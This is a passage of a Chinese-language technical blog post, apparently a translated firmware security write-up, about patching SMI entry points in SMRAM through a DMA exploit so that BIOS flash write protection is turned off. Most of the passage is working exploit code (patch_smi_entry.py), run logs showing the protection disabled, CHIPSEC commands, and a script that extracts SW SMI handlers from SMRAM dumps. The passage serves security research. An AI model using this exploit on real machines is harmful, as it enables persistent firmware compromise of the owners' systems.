<p>不幸的是，我还没有弄清楚为什么我的主板固件SMI入口点实际位于如此奇怪的偏移处，而不是根据所有公开可用的文档应该位于的0x8000。这可能与Sandy Bridge有某种关系，因为我的另一台具有相同硬件的测试系统（Apple MacBook Pro 10,2）也是一样的SMI偏移量。如果你有任何有关此问题的信息，请告诉我:)</p>
<h2 id="修改SMI入口点"><a href="#修改SMI入口点" class="headerlink" title="修改SMI入口点"></a>修改SMI入口点</h2><p>现在我们清楚了SMI入口点的地址，接下来可以通过RSM指令来修改这些入口点，使BIOSWE位置1，实现DMA攻击：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSM + NOP patch for SMI entry</span></span><br><span class="line">SMI_ENTRY_PATCH = <span class="string">&#x27;\x0F\xAA\x90&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_smi_entry</span>(<span class="params">smram_addr, smram_size</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    modified_pages = &#123;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Dumping SMRAM...&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># initialize exploit</span></span><br><span class="line">    expl = dma_expl.DmaExpl(smram_addr)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># read all SMRAM contents</span></span><br><span class="line">        data = expl.read(smram_size)</span><br><span class="line">        expl.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        expl.close()</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Patching SMI entries...&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># find SMI handlers offsets</span></span><br><span class="line">    <span class="keyword">for</span> ptr <span class="keyword">in</span> find_smi_entry(data):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        page_offs = ptr &amp; <span class="number">0xFFF</span></span><br><span class="line">        page_addr = ptr - page_offs</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># get data for single memory page</span></span><br><span class="line">        <span class="keyword">if</span> modified_pages.has_key(page_addr):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            page_data = modified_pages[page_addr]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            page_data = data[ptr : ptr + dma_expl.PAGE_SIZE]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># patch first instruction of SMI entry</span></span><br><span class="line">        page_data = page_data[: page_offs] + SMI_ENTRY_PATCH + \</span><br><span class="line">                    page_data[page_offs + <span class="built_in">len</span>(SMI_ENTRY_PATCH) :]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        modified_pages[page_addr] = page_data</span><br><span class="line">        ret += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> page_addr, page_data <span class="keyword">in</span> modified_pages.items():</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># initialize exploit</span></span><br><span class="line">        expl = dma_expl.DmaExpl(smram_addr + page_addr)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># write modified page back to SMRAM</span></span><br><span class="line">            expl.write(page_data)</span><br><span class="line">            expl.close()        </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            expl.close()</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] DONE, %d SMI handlers patched&#x27;</span> % ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>

<p>我编写一个名为<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/UEFI_boot_script_expl/blob/master/patch_smi_entry.py">patch_smi_entry.py</a>的python程序，该程序可以接受SMRAM地址和大小为命令行参数，完成所有的工作并报告BIOS写入启用状态。<br>在正常运行的SMM代码上检查BIOS写保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec # python chipsec_util.py spi disable-wp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[CHIPSEC] Executing command &#x27;spi&#x27; with args [&#x27;disable-wp&#x27;]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[CHIPSEC] Trying to disable BIOS write protection..</span><br><span class="line">[-] Couldn&#x27;t disable BIOS region write protection in SPI flash</span><br><span class="line">[CHIPSEC] (spi disable-wp) time elapsed 0.000</span><br></pre></td></tr></table></figure>


<p>运行SMI修改程序来攻击SMM代码：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ <span class="comment"># python patch_smi_entry.py 0xd7000000 0x800000</span></span><br><span class="line">[+] BIOS_CNTL is 0x2a</span><br><span class="line">[!] Can<span class="string">&#x27;t set BIOSWE bit, BIOS write protection is enabled</span></span><br><span class="line"><span class="string">[+] Dumping SMRAM...</span></span><br><span class="line"><span class="string">[+] Memory allocated at 0x7f614ee2b000</span></span><br><span class="line"><span class="string">[+] Physical address is 0xc973f000</span></span><br><span class="line"><span class="string">Pass 1: parsed user script and 109 library script(s) using 62172virt/36372res/4212shr/32972data kb, in 170usr/10sys/315real ms.</span></span><br><span class="line"><span class="string">Pass 2: analyzed script: 1 probe(s), 14 function(s), 4 embed(s), 2 global(s) using 108876virt/84540res/5632shr/79676data kb, in 810usr/440sys/13062real ms.</span></span><br><span class="line"><span class="string">Pass 3: translated to C into &quot;/tmp/stapi26CgT/stap_06ba24e9748ef9297b5a524f191d9536_7942_src.c&quot; using 108876virt/84684res/5776shr/79676data kb, in 190usr/50sys/251real ms.</span></span><br><span class="line"><span class="string">Pass 4: compiled C into &quot;stap_06ba24e9748ef9297b5a524f191d9536_7942.ko&quot; in 3550usr/310sys/6154real ms.</span></span><br><span class="line"><span class="string">Pass 5: starting run.</span></span><br><span class="line"><span class="string">[+] SystemTap script started</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7000000 - 0xd701dfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd701e000 - 0xd703bfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd703c000 - 0xd7059fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd705a000 - 0xd7077fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7078000 - 0xd7095fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7096000 - 0xd70b3fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd70b4000 - 0xd70d1fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd70d2000 - 0xd70effff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd70f0000 - 0xd710dfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd710e000 - 0xd712bfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd712c000 - 0xd7149fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd714a000 - 0xd7167fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7168000 - 0xd7185fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7186000 - 0xd71a3fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd71a4000 - 0xd71c1fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd71c2000 - 0xd71dffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd71e0000 - 0xd71fdfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd71fe000 - 0xd721bfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd721c000 - 0xd7239fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd723a000 - 0xd7257fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7258000 - 0xd7275fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7276000 - 0xd7293fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7294000 - 0xd72b1fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd72b2000 - 0xd72cffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd72d0000 - 0xd72edfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd72ee000 - 0xd730bfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd730c000 - 0xd7329fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd732a000 - 0xd7347fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7348000 - 0xd7365fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7366000 - 0xd7383fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7384000 - 0xd73a1fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd73a2000 - 0xd73bffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd73c0000 - 0xd73ddfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd73de000 - 0xd73fbfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd73fc000 - 0xd7419fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd741a000 - 0xd7437fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7438000 - 0xd7455fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7456000 - 0xd7473fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7474000 - 0xd7491fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7492000 - 0xd74affff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd74b0000 - 0xd74cdfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd74ce000 - 0xd74ebfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd74ec000 - 0xd7509fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd750a000 - 0xd7527fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7528000 - 0xd7545fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7546000 - 0xd7563fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7564000 - 0xd7581fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7582000 - 0xd759ffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd75a0000 - 0xd75bdfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd75be000 - 0xd75dbfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd75dc000 - 0xd75f9fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd75fa000 - 0xd7617fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7618000 - 0xd7635fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7636000 - 0xd7653fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7654000 - 0xd7671fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7672000 - 0xd768ffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7690000 - 0xd76adfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd76ae000 - 0xd76cbfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd76cc000 - 0xd76e9fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd76ea000 - 0xd7707fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7708000 - 0xd7725fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7726000 - 0xd7743fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7744000 - 0xd7761fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7762000 - 0xd777ffff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd7780000 - 0xd779dfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd779e000 - 0xd77bbfff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd77bc000 - 0xd77d9fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd77da000 - 0xd77f7fff</span></span><br><span class="line"><span class="string">[+] Reading physical memory 0xd77f8000 - 0xd77fffff</span></span><br><span class="line"><span class="string">[+] DONE</span></span><br><span class="line"><span class="string">[+] Patching SMI entries...</span></span><br><span class="line"><span class="string">SMI entry found at 0x3f6000</span></span><br><span class="line"><span class="string">SMI entry found at 0x3f6800</span></span><br><span class="line"><span class="string">SMI entry found at 0x3f7000</span></span><br><span class="line"><span class="string">SMI entry found at 0x3f7800</span></span><br><span class="line"><span class="string">SMI entry found at 0x3f8000</span></span><br><span class="line"><span class="string">[+] Memory allocated at 0x7f614a470000</span></span><br><span class="line"><span class="string">[+] Physical address is 0x3ef092000</span></span><br><span class="line"><span class="string">Pass 1: parsed user script and 109 library script(s) using 62176virt/36352res/4192shr/32976data kb, in 160usr/10sys/172real ms.</span></span><br><span class="line"><span class="string">Pass 2: analyzed script: 1 probe(s), 14 function(s), 4 embed(s), 2 global(s) using 108880virt/84616res/5708shr/79680data kb, in 790usr/200sys/995real ms.</span></span><br><span class="line"><span class="string">Pass 3: translated to C into &quot;/tmp/stapEg28Q9/stap_b74b06d8681a8605cef014148ae17b5b_7943_src.c&quot; using 108880virt/84744res/5836shr/79680data kb, in 180usr/60sys/237real ms.</span></span><br><span class="line"><span class="string">Pass 4: compiled C into &quot;stap_b74b06d8681a8605cef014148ae17b5b_7943.ko&quot; in 3530usr/280sys/5236real ms.</span></span><br><span class="line"><span class="string">Pass 5: starting run.</span></span><br><span class="line"><span class="string">[+] SystemTap script started</span></span><br><span class="line"><span class="string">[+] Writing physical memory 0xd73f6000 - 0xd73f6fff</span></span><br><span class="line"><span class="string">[+] DONE</span></span><br><span class="line"><span class="string">[+] Memory allocated at 0x7f614ee2b000</span></span><br><span class="line"><span class="string">[+] Physical address is 0x3f3bcf000</span></span><br><span class="line"><span class="string">Pass 1: parsed user script and 109 library script(s) using 62176virt/36284res/4124shr/32976data kb, in 160usr/10sys/173real ms.</span></span><br><span class="line"><span class="string">Pass 2: analyzed script: 1 probe(s), 14 function(s), 4 embed(s), 2 global(s) using 108880virt/84532res/5628shr/79680data kb, in 790usr/200sys/995real ms.</span></span><br><span class="line"><span class="string">Pass 3: translated to C into &quot;/tmp/stapaurR1A/stap_f296db5c81c5158e1ac0e155bbaaf3b6_7943_src.c&quot; using 108880virt/84660res/5756shr/79680data kb, in 180usr/60sys/233real ms.</span></span><br><span class="line"><span class="string">Pass 4: compiled C into &quot;stap_f296db5c81c5158e1ac0e155bbaaf3b6_7943.ko&quot; in 3530usr/260sys/6606real ms.</span></span><br><span class="line"><span class="string">Pass 5: starting run.</span></span><br><span class="line"><span class="string">[+] SystemTap script started</span></span><br><span class="line"><span class="string">[+] Writing physical memory 0xd73f7000 - 0xd73f7fff</span></span><br><span class="line"><span class="string">[+] DONE</span></span><br><span class="line"><span class="string">[+] Memory allocated at 0x7f614a470000</span></span><br><span class="line"><span class="string">[+] Physical address is 0x3ef096000</span></span><br><span class="line"><span class="string">Pass 1: parsed user script and 109 library script(s) using 62176virt/36396res/4236shr/32976data kb, in 160usr/10sys/172real ms.</span></span><br><span class="line"><span class="string">Pass 2: analyzed script: 1 probe(s), 14 function(s), 4 embed(s), 2 global(s) using 108880virt/84656res/5752shr/79680data kb, in 790usr/200sys/997real ms.</span></span><br><span class="line"><span class="string">Pass 3: translated to C into &quot;/tmp/stapXeWg7I/stap_5ab1311d1369a5f00c3287bf44fa61aa_7943_src.c&quot; using 108880virt/84784res/5880shr/79680data kb, in 190usr/50sys/236real ms.</span></span><br><span class="line"><span class="string">Pass 4: compiled C into &quot;stap_5ab1311d1369a5f00c3287bf44fa61aa_7943.ko&quot; in 3530usr/270sys/4677real ms.</span></span><br><span class="line"><span class="string">Pass 5: starting run.</span></span><br><span class="line"><span class="string">[+] SystemTap script started</span></span><br><span class="line"><span class="string">[+] Writing physical memory 0xd73f8000 - 0xd73f8fff</span></span><br><span class="line"><span class="string">[+] DONE</span></span><br><span class="line"><span class="string">[+] DONE, 4 SMI handlers patched</span></span><br><span class="line"><span class="string">[+] BIOS_CNTL is 0x2a</span></span><br><span class="line"><span class="string">[+] BIOSWE bit was set, BIOS write protection is disabled now</span></span><br></pre></td></tr></table></figure>


<p>现在BIOS写保护被禁用了：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec <span class="comment"># python chipsec_util.py spi disable-wp</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[CHIPSEC] Executing <span class="built_in">command</span> <span class="string">&#x27;spi&#x27;</span> with args [<span class="string">&#x27;disable-wp&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[CHIPSEC] Trying to <span class="built_in">disable</span> BIOS write protection..</span><br><span class="line">[+] BIOS region write protection is disabled <span class="keyword">in</span> SPI flash</span><br><span class="line">[CHIPSEC] (spi disable-wp) time elapsed 0.000</span><br></pre></td></tr></table></figure>

<p>请注意，在运行DMA攻击代码之前，你还需要运行 CHIPSEC的 <code>boot_script_table</code>模块来利用UEFI启动脚本表漏洞并禁用<code>TSEGMB</code>保护，在其他情况下——如在正确锁定了SMRAM的读写区域时，执行patch_smi_entry.py或dma_expl.py可能会导致意外行为（比如系统被冻结）。<br>为了更方便地在我的测试硬件上处理这种攻击，我在USB闪存驱动器上安装了带有正确配置内核的Gentoo Linux，并把CHIPSEC代码和所有必要的东西都备份在里面了。</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162742381.png" alt="image-20230809162742381"></p>
<p>我的Apple MacBook Pro 10,2（也有UEFI启动脚本表漏洞）不受SMI入口点修改程序的影响，因为它使用BIOS保护区域寄存器（完全不依赖SMM），而不是用<code>BIOS_CNTL</code>来实现闪存写保护。但是，<code>dma_expl.py</code>程序支持此Apple硬件，并且我能转储它的SMRAM中的内容，这对于其他研究目的（例如SMM代码的安全审计）可能很有用。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>不久前，有两篇关于SMM代码漏洞的类似工作：Intel Security的“<a target="_blank" rel="noopener" href="https://cansecwest.com/slides/2015/A%20New%20Class%20of%20Vulnin%20SMI%20-%20Andrew%20Furtak.pdf">A New Class of Vulnerabilities in SMI Handlers</a>”和LegbaCore的“<a target="_blank" rel="noopener" href="http://legbacore.com/Research_files/HowManyMillionBIOSWouldYouLikeToInfect_Full.pdf">How Many Million BIOSes  Would you Like to Infect?</a>”。这些作者发现了SMI软件处理程序中的许多漏洞，这些漏洞是通过固件代码使用<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/500e2ac246e14dd4f861026db112248252f47246/MdePkg/Include/Protocol/SmmSwDispatch2.h">EFI_SMM_SW_DISPATCH2_PROTOCOL</a>注册的，操作系统可以通过将处理程序编号写入AMPC I&#x2F;O端口B2h来触发此类处理程序。<br>为了检查我的机器的SMM代码是否存在此类漏洞，我还写了两个Python脚本，用来转储的SMRAM内容，并找到所有已注册的SW SMI处理程序及其编号。也许你会发现它很有用。<br>在Intel DQ77KB中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Extract SW SMI handlers information from SMRAM dump.</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">$ python smi_handlers.py TSEG.bin</span></span><br><span class="line"><span class="string">0xcc: 0xd70259d8</span></span><br><span class="line"><span class="string">0xb8: 0xd706673c</span></span><br><span class="line"><span class="string">0xba: 0xd706e970</span></span><br><span class="line"><span class="string">0x05: 0xd706b474</span></span><br><span class="line"><span class="string">0x04: 0xd706b45c</span></span><br><span class="line"><span class="string">0x03: 0xd706b2e0</span></span><br><span class="line"><span class="string">0x01: 0xd706b2dc</span></span><br><span class="line"><span class="string">0xa1: 0xd70664c4</span></span><br><span class="line"><span class="string">0xa0: 0xd706636c</span></span><br><span class="line"><span class="string">0x40: 0xd70254f8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys, os, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># get range from string</span></span><br><span class="line">        data_at = <span class="keyword">lambda</span> offs, size: data[i + offs : i + offs + size]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># 00: &quot;SMIH&quot;</span></span><br><span class="line">        <span class="comment"># 04: handler address (qword)</span></span><br><span class="line">        <span class="comment"># 0c: SW SMI value (byte)</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="keyword">if</span> data_at(<span class="number">0</span>, <span class="number">4</span>) == <span class="string">&#x27;SMIH&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            addr, val = struct.unpack(<span class="string">&#x27;QB&#x27;</span>, data_at(<span class="number">4</span>, <span class="number">8</span> + <span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> val != <span class="number">0</span> <span class="keyword">and</span> addr &lt; <span class="number">0xffffffff</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;0x%.2x: 0x%.8x&#x27;</span> % (val, addr)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>


<p>在Apple MacBookPro 10,2中：</p>
